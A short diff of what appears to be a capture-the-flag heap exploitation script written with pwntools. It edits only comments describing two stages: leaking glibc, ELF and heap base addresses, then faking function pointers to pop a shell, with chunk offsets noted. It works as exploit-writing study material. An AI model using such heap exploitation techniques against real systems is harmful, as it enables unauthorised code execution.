@@ -75,7 +75,7 @@ def sign(id):
 
 glibc_e = ELF('./libc.so.6')
 
-# Stage 1: leak glibc base address, elf base address, and heap base address
+# Stage 1: leak glibc base address, elf base address, and heap base address (make chunk X (0xcff0) unlinkable, explained in detail below)
 # allocate 4 chunks for later use (a-d)
 a = create(b'a') # 0xe000
 b = create(b'b') # 0xe140
@@ -159,7 +159,7 @@ log.info(f"elf base address: {hex(elf_base_addr)}")
 heap_base_addr = u64(leaks[0x1008-0x10:0x1010-0x10])-0x280
 log.info(f"heap base address: {hex(heap_base_addr)}")
 
-# Stage 2: fake function pointers to pop a shell (chunk Z is fake_crypto, explained in detail below)
+# Stage 2: fake function pointers to pop a shell (make chunk Y (0xe8d8) unlinkable, and chunk Z (0xe3c8) is fake_crypto, explained in detail below)
 # allocate 7 chunks for later use (b-h)
 b = create(b'b') # 0xe140
 sign(c) # 0xe280
